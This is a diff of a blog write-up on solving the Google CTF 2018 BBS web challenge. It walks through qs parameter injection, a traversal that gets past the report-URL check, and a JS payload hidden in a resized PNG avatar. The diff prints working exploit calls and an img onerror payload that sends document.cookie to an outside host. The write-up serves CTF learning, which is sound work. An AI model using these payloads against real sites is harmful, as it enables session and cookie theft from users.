@@ -7,7 +7,7 @@ tags: googlectf, gctf, gctf2018quals, web
 
 Last weekend I played on the Google CTF 2018 Quals which was one of the best CTFs I played recently. They separated the easy challenges into a "beginner's quest" so we got only the medium-hard ones. I think this was a really good choice and made the whole CTF experience more pleasant. Also as with other CTFs, changing to dynamic scoring was also a welcomed change.
 
-I started solving all the web challenges as our web guy was missing on Saturday and nobody else is really into web, and as I am kind of a jack of all trades when comes to CTFs, I looked into the web one. At the end (I mean at the _really_ end but I will talk about this later) we solved all the web challenges, including BBS which was only solved 3 teams at the end of the CTF.
+I started solving all the web challenges as our web guy was missing on Saturday and nobody else is really into web, and as I am kind of a jack of all trades when comes to CTFs, I looked into the web ones. At the end (I mean at the _really_ end but I will talk about this later) we solved all the web challenges, including BBS which was only solved by 3 teams by the end of the CTF.
 
 ![alt]({{ site.url }}/images/gctf2018quals/bbs_chall_desc.png)
 
@@ -17,7 +17,7 @@ BBS was... well... a BBS ([wikipedia article](https://en.wikipedia.org/wiki/Bull
 
 ![alt]({{ site.url }}/images/gctf2018quals/bbs_website.png)
 
-The functionality of the website was really simple: you could register (`Home > New`), you could login (`Home > Open`), contact the admin (`Home > Contact` - this menu did not do anything, but more about later):
+The functionality of the website was really simple: you could register (`Home > New`), you could login (`Home > Open`), contact the admin (`Home > Contact` - this menu did not do anything, but more about this later):
 
 ![alt]({{ site.url }}/images/gctf2018quals/bbs_menu.png)
 
@@ -29,17 +29,17 @@ You could also modify your profile settings:
 
 ![alt]({{ site.url }}/images/gctf2018quals/bbs_profile.png)
 
-For avatar image only PNG files were accepted (really file type mattered, not the extension) but they were resized to 64x64 PNGs (in every case, even if you uploaded a PNG with the exact same size). The resized PNG was saved to `https://bbs.web.ctfcompetition.com/avatar/<md5_hash_of_the_resized_png>`
+For avatar images only PNG files were accepted (the file type mattered, not the extension) but they were resized to 64x64 PNGs (in every case, even if you uploaded a PNG with the exact same size). The resized PNG was saved to `https://bbs.web.ctfcompetition.com/avatar/<md5_hash_of_the_resized_png>`
 
 # Let's look under the hood!
 
-So after the other web challenges (we solved this after the other 4 one) I first checked the headers, especially the [Content Security Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
+So after the other web challenges (we solved this after the other 4 web ones) I first checked the headers, especially the [Content Security Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
 
 {% highlight text %} 
 Content-Security-Policy: default-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
 {% endhighlight %} 
 
-This means if we found an XSS then we can inject `<script>` tags and execute code (that's the `unsafe-inline`), but only on the BBS challenge domain (because of the `self`) and we cannot communicate with other domains (eg. I could not download files from my domain).
+This means if we find an XSS then we can inject `<script>` tags and execute code (that's the `unsafe-inline`), but only on the BBS challenge domain (because of the `self`) and we cannot communicate with other domains (eg. I could not download files from my domain).
 
 The [website's source](view-source:https://bbs.web.ctfcompetition.com/) revealed that most of the logic was in the [app.js](https://bbs.web.ctfcompetition.com/assets/app.js) file.
 
@@ -74,17 +74,21 @@ function load_post() {
 }
 {% endhighlight %}
 
-As the `url` parameter was an input from the query string we could modify the any other URL! Let's change it to our website (eg. kt.gy) and serve some nasty payload! Oh... wait... we cannot because of the CSP...
+As the `url` parameter was an input from the query string we could modify the any other URL!
+
+Let's change it to our website (eg. kt.gy) and serve some nasty payload!
+
+Oh... wait... we cannot because of the CSP...
 
 ![alt]({{ site.url }}/images/gctf2018quals/bbs_csp.png)
 
 ((Yes, I know I did not update my Chrome in time, but I promise I will, okay???))
 
-As the BBS server HTML-encoded every post response (after making them also [l33tsp43k](https://en.wikipedia.org/wiki/Leet)), we had to find some other way to inject our content.
+As the BBS server HTML-encoded every post's response (after making them also [l33tsp43k](https://en.wikipedia.org/wiki/Leet)), we had to find some other way to inject our content.
 
-There is the avatar upload of course, but we cannot make a PNG-Base64 [polyglot](https://en.wikipedia.org/wiki/Polyglot_(computing)) as the code called a base64 decode (`atob`) before injecting in the site as HTML.
+There is the avatar upload of course, but we cannot make a PNG-Base64 [polyglot](https://en.wikipedia.org/wiki/Polyglot_(computing)) as the code called a base64 decode (`atob`) before injecting into the site as HTML.
 
-But if we look at the code a little bit more we can see that the query string parsing using a module (`qs`) which handles creating objects if we use query string in the format like this:
+But if we look at the code a little bit more we can see that the query string parsing is using a module (`qs`) which can create objects if we use query string in the format like this:
 
 {% highlight text %}
 /post?p[key1]=value1&p[key2][subkey]=value2
@@ -134,31 +138,31 @@ On the other hand the `/admin` endpoint does not look too promising: even report
 
 But even if this did work, we could not modify the `/post?p=` parameter.
 
-Actually the solution is easier than thought, you the `/report` endpoint just checks that the url is in format `/admin/<id>`, so this URL will bypass the filter:
+Actually the solution is easier than thought, the `/report` endpoint just checks that the url is in format `/admin/<id>`, so this URL will bypass the filter:
 
 {% highlight javascript %}
 $.post('/report', { 'post': '/admin/1/../../post?p[url]=/avatar/223d6cf0f4b320cdd3158927d5934634&p[headers][Range]=bytes=40-200' })
 {% endhighlight %}
 
-Okay, we put together everything, we spent only 1.5 hours solving the challenge till now, we just need a PNG image which contains our base64 payload. It should be simple, right?
+Okay, now that we put together everything, we spent only 1.5 hours solving the challenge till now, we just need a PNG image which contains our base64 payload. It should be simple, right?
 
 # That moment when you feel you won't solve this challenge any time soon
 
-Well yeah, it should be kind of simple. As mentioned earlier the uploaded PNG is resized every time and all the metadata (eg. comment sections) are dropped, only image data is used.
+Well yeah, it should be kind of simple. As mentioned earlier the uploaded PNG is resized every time and all the metadata (eg. comment sections) are stripped, only image data is used.
 
 The image data is compressed with zlib. But if you use a high entropy input the compression engine will use the input bytes literally, so you can 'bypass' the compression part and inject your payload directly.
 
 Or can you?
 
-I've spend the next **3.5 hours** to create a PNG which contained my base64 payload. After creating approximately ~1369 PNG files, I gave up. ;)
+I've spent the next **3.5 hours** to create a PNG which contained my base64 payload. After creating approximately ~1369 PNG files, I gave up. ;)
 
-The main problem was that the PNG encoder tries to minimalize the file size by [applying filtering](https://en.wikipedia.org/wiki/Portable_Network_Graphics#Filtering) to every row before sending into zlib. And I could choose any input filtering method for my payload to PNG encoder changed it something else.
+The main problem was that the PNG encoder tries to minimalize the file size by [applying filtering](https://en.wikipedia.org/wiki/Portable_Network_Graphics#Filtering) to every row before sending into zlib. And even if I chose any input filtering method for my payload, the PNG encoder always changed it to something else.
 
-I went so mad, I even thought it must be a custom PNG encoder created for this challenges just to make our job harder. As there was only 1 solve on the challenge that time I thought it could be a valid theory...
+I went so mad, I even thought it must be some custom PNG encoder created only for this challenges just to make our job harder. As there was only 1 solve on the challenge that time so I thought this could be even a valid theory...
 
 So I tried to experiment with various tricks to bypass this 'tricky converter' like generating such input which will contain my payload for every possible filter mode and stuff like that.
 
-After the competition I spoke with the challenge author (phiber) and he told me this was of course not try, in the opposite he used the most generic conversion code that can be used:
+After the competition I spoke with the challenge author (phiber) and he told me this was of course not true, in the opposite of that, he used the most generic conversion code that can be used:
 
 {% highlight php %}
 $im = imagecreatefrompng($path)
@@ -166,7 +170,7 @@ $resized = imagecreatetruecolor(64, 64);
 imagecopyresampled($resized, $im, 0, 0, 0, 0, 64, 64, $width, $height);
 {% endhighlight %}
 
-Of course I did not know this that time, but...
+Of course I did not know this at time of solving the challenge, but...
 
 ![alt](http://i0.kym-cdn.com/entries/icons/original/000/000/554/picard-facepalm.jpg)
 
@@ -178,9 +182,9 @@ Of course I did not know this that time, but...
 
 # That moment when you've just given up
 
-So it was only 30 minutes left from the Google CTF Quals and it was clear I won't be able to generate a correct PNG, but as a last time effort I looked into the code again...
+So it was only 30 minutes left from the Google CTF Quals and it was clear I won't be able to generate a correct PNG in time, but as a last time effort I looked into the code again...
 
-Also I knew from the latest 3.5 hours of trying that I can inject smaller payload as that won't be changed, but the smallest base64 payload was not small enough. Maybe a raw JS payload?
+Also I knew from the latest 3.5 hours of trying that I can inject smaller payload as that won't be changed, but the smallest base64 payload was not small enough. Maybe a raw JS payload? The smallest one I could create was
 
 {% highlight javascript %}
 $(atob(location.hash.slice(1)))
@@ -210,7 +214,13 @@ The final step was just to send this URL to the admin:
 $.post('/report', { 'post': '/admin/1/../../post?p[url]=/avatar/0939691cf1a771225f6ba39bb9934686&p[headers][Range]=bytes=12326-12356&p[dataType]=script#PGltZyBzcmM9eCBvbmVycm9yPSJsb2NhdGlvbj0nLy9jdWJ5LmRhdGFnbG9iZS5ldS94L0ZMQUcnK2RvY3VtZW50LmNvb2tpZSIgLz4=' })
 {% endhighlight %}
 
-Which finally gave me the flag:
+This was the encoded payload, but probably others were working as well (but the `location=` type redirection is important as CSP blocks almost every other way):
+
+{% highlight html %}
+<img src=x onerror="location='//cuby.dataglobe.eu/x/FLAG'+document.cookie" />
+{% endhighlight %}
+
+Finally I've got the flag:
 
 {% highlight text %}
 CTF{yOu_HaVe_Been_b&}
